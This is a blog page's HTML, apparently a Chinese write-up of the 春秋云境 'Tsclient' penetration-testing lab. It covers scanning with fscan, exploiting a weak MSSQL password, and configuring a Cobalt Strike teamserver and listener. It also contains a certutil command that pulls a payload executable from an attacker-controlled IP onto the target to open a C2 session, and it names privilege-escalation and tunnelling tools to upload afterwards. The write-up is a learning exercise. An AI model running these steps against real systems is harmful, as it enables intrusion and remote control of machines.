@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="flag01首先用fscan扫描，得到1443端口开放了mssql服务 且存在弱口令  使用mdut工具连接后，发现权限较低，思路是使用甜土豆提权，也要上传fscan扫描内网，所以先上线CS 这里介绍一下CobaltStrike工具 cobaltstrike工具工具分服务端和客户端 服务端只能在Linux系统下运行，所以上传到服务器使用就可以  关键文件是teamserver 使用命令：.&#x2F;tea">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境-Tsclient">
+<meta property="og:url" content="http://example.com/2025/05/20/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="flag01首先用fscan扫描，得到1443端口开放了mssql服务 且存在弱口令  使用mdut工具连接后，发现权限较低，思路是使用甜土豆提权，也要上传fscan扫描内网，所以先上线CS 这里介绍一下CobaltStrike工具 cobaltstrike工具工具分服务端和客户端 服务端只能在Linux系统下运行，所以上传到服务器使用就可以  关键文件是teamserver 使用命令：.&#x2F;tea">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image-20250520171608022.png">
+<meta property="og:image" content="http://example.com/images/image-20250521161843362.png">
+<meta property="og:image" content="http://example.com/images/image-20250521162058336.png">
+<meta property="og:image" content="http://example.com/images/image-20250521162126251.png">
+<meta property="og:image" content="http://example.com/images/image-20250521162312099.png">
+<meta property="og:image" content="http://example.com/images/image-20250521162350472.png">
+<meta property="og:image" content="http://example.com/images/image-20250521164230656.png">
+<meta property="article:published_time" content="2025-05-20T09:14:53.000Z">
+<meta property="article:modified_time" content="2025-05-22T07:10:27.192Z">
+<meta property="article:author" content="xin">
+<meta property="article:tag" content="春秋云境">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20250520171608022.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云境-Tsclient</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/05/22/jwt/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/20/ssrf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/20/2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/20/2/&text=春秋云境-Tsclient"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/20/2/&title=春秋云境-Tsclient"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/20/2/&is_video=false&description=春秋云境-Tsclient"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Tsclient&body=Check out this article: http://example.com/2025/05/20/2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/20/2/&title=春秋云境-Tsclient"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/20/2/&title=春秋云境-Tsclient"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/20/2/&title=春秋云境-Tsclient"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/20/2/&title=春秋云境-Tsclient"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/20/2/&name=春秋云境-Tsclient&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/20/2/&t=春秋云境-Tsclient"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag01"><span class="toc-number">1.</span> <span class="toc-text">flag01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cobaltstrike%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text">cobaltstrike工具</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云境-Tsclient
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">xin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-20T09:14:53.000Z" class="dt-published" itemprop="datePublished">2025-05-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/" rel="tag">春秋云境</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>首先用fscan扫描，得到1443端口开放了mssql服务 且存在弱口令</p>
+<p><img src="/../images/image-20250520171608022.png" alt="image-20250520171608022"></p>
+<p>使用mdut工具连接后，发现权限较低，思路是使用甜土豆提权，也要上传fscan扫描内网，所以<strong>先上线CS</strong></p>
+<p>这里介绍一下<code>CobaltStrike</code>工具</p>
+<h2 id="cobaltstrike工具"><a href="#cobaltstrike工具" class="headerlink" title="cobaltstrike工具"></a>cobaltstrike工具</h2><p>工具分服务端和客户端</p>
+<p>服务端只能在Linux系统下运行，所以上传到服务器使用就可以</p>
+<p><img src="/../images/image-20250521161843362.png" alt="image-20250521161843362"></p>
+<p>关键文件是<code>teamserver</code></p>
+<p>使用命令：<code>./teamserver [IP] [连接密码]</code></p>
+<p>如下所示：<br><img src="/../images/image-20250521162058336.png" alt="image-20250521162058336"></p>
+<p>客户端连接图：<br><img src="/../images/image-20250521162126251.png" alt="image-20250521162126251"></p>
+<p>输入 <code>[ip]</code>、<code>[端口]</code> 用户名随便、密码就是刚才设置的密码</p>
+<p>连接好之后设置监听器</p>
+<p><img src="/../images/image-20250521162312099.png" alt="image-20250521162312099"></p>
+<p><img src="/../images/image-20250521162350472.png" alt="image-20250521162350472"></p>
+<p>监听器的各类参数如下：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>释义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>name</td>
+<td>为监听器名字，可任意</td>
+</tr>
+<tr>
+<td>payload</td>
+<td>payload类型</td>
+</tr>
+<tr>
+<td>HTTP Hosts</td>
+<td>shell反弹的主机，也就是我们 CS 服务器的 IP</td>
+</tr>
+<tr>
+<td>HTTP Hosts(Stager)</td>
+<td>Stager的马请求下载payload的地址</td>
+</tr>
+<tr>
+<td>HTTP Port(C2)</td>
+<td>C2监听的端口</td>
+</tr>
+</tbody></table>
+<p>Cobaltstrike 4.1 版本提供了 8 种监听器，</p>
+<p>beacon_xx 系列为 Cobalt Strike 自身内置的监听器，即在目标主机执行相应的payload，获取 shell 到 CS 上，包括 dns、http、https、smb 四种方式的监听器；<br>foreign 系列为外部监听器，通常与 MSF 或者 Armitage 联动，例如获取 meterpreter 到 MSF上。</p>
+<hr>
+<p>下面继续讲：<br>生成payload上传到靶机：使用windows下载命令</p>
+<p><code>certutil -f -split -urlcache http://[ip]/1111.exe C:\Users\Public\1111.exe</code></p>
+<p><img src="/../images/image-20250521164230656.png" alt="image-20250521164230656"></p>
+<p>下载好了运行即可</p>
+<p>运行之后就可以看到主机上线了，然后进入文件浏览上传stoaway、fscan、sweetpotato</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag01"><span class="toc-number">1.</span> <span class="toc-text">flag01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cobaltstrike%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text">cobaltstrike工具</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/20/2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/20/2/&text=春秋云境-Tsclient"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/20/2/&title=春秋云境-Tsclient"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/20/2/&is_video=false&description=春秋云境-Tsclient"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Tsclient&body=Check out this article: http://example.com/2025/05/20/2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/20/2/&title=春秋云境-Tsclient"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/20/2/&title=春秋云境-Tsclient"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/20/2/&title=春秋云境-Tsclient"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/20/2/&title=春秋云境-Tsclient"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/20/2/&name=春秋云境-Tsclient&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/20/2/&t=春秋云境-Tsclient"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    xin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
